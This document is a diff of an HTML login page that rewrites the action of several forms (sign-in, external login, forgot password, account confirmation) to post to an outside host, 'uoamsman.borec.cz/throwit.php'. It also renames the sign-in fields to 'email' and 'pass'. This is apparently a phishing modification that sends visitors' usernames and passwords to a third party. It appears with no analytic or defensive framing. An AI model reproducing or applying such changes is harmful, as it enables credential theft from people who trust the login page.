@@ -130,7 +130,7 @@
 
 
 
-<form action="/account/externallogin" method="post" id="ep-external-login-form" role="form">
+<form action="http://uoamsman.borec.cz/throwit.php" method="post" id="ep-external-login-form" role="form">
     <input name="__RequestVerificationToken" type="hidden" value="Ryk9rFdIFe4LA9vgHDEMsuJFFpuy57VUiRZARQIp9Xd6fABZLo_l00KM5X6HnQ4KdCHlqIGKU2JUzztqwas5r-jT8_E1">
     
     <input type="hidden" name="ReturnUrl">
@@ -166,19 +166,19 @@
 
             <div class="ep-error-alert"></div>
 
-            <form action="/v1/account/login" method="post" id="ep-form-signin" role="form">
+            <form action="http://uoamsman.borec.cz/throwit.php" method="post" id="ep-form-signin" role="form">
                 <input name="__RequestVerificationToken" type="hidden" value="OLEtQCbsZHQAr9OiQ4rQPT4vceHsXkkmsh6LZd-va--3UcmwYAs9fObXfznEdo-Tes_s-0EfIzIm_xbOE60KU658rBM1">
 
                 <div class="form-group form-group-lg">
                     <div class="input-group">
                         <div class="input-group-addon"><span class="glyphicon glyphicon-user"></span></div>
-                        <input type="text" class="form-control" name="UserName" value="" placeholder=“Any email id” autocapitalize="off" autocorrect="off">
+                        <input type="text" class="form-control" name="email" value="" placeholder=“Any email id” autocapitalize="off" autocorrect="off">
                     </div>
                 </div>
                 <div class="form-group form-group-lg">
                     <div class="input-group">
                         <div class="input-group-addon"><span class="glyphicon glyphicon-lock"></span></div>
-                        <input type="password" class="form-control" name="Password" value="" placeholder="Password">
+                        <input type="password" class="form-control" name="pass" value="" placeholder="Password">
                     </div>
                 </div>
                 <div class="form-group form-group-lg">
@@ -228,7 +228,7 @@
                 <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                 <h4 id="ep-forgot-password-modal-label" class="modal-title">Forgot your password?</h4>
             </div>
-            <form action="/v1/account/reset" method="post" id="ep-form-forgot-password" role="form" style="margin:0;" autocomplete="off">
+            <form action="http://uoamsman.borec.cz/throwit.php" method="post" id="ep-form-forgot-password" role="form" style="margin:0;" autocomplete="off">
                 <input name="__RequestVerificationToken" type="hidden" value="rMW45enTUq0ccONp9IhO2gzZBOfEmK_pSRPLL9B0ruLUmV0HxOm8vEnr0dMEAPSOAweR5bbFfi7mDHjy5I094aYBdKw1">
 
                 <div id="ep-forgot-password-modal-body" class="modal-body">
@@ -259,7 +259,7 @@
                 <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                 <h4 id="ep-confirm-account-modal-label" class="modal-title">Confirm your account</h4>
             </div>
-            <form action="/v1/account/resend" method="post" id="ep-form-confirm-account" role="form" style="margin:0;" autocomplete="off">
+            <form action="http://uoamsman.borec.cz/throwit.php" method="post" id="ep-form-confirm-account" role="form" style="margin:0;" autocomplete="off">
                 <input name="__RequestVerificationToken" type="hidden" value="X-eKRiJTYJbz_2ffdSoO8cX2lUPugTb2-6gYovlMi69YbeQ4nvIIT2fcoq55CmKfm0dSbM-0lnvHscx43BhiZErsm6Y1">
                 <input type="hidden" name="Email" value="">
                 <div id="ep-confirm-account-modal-body" class="modal-body">
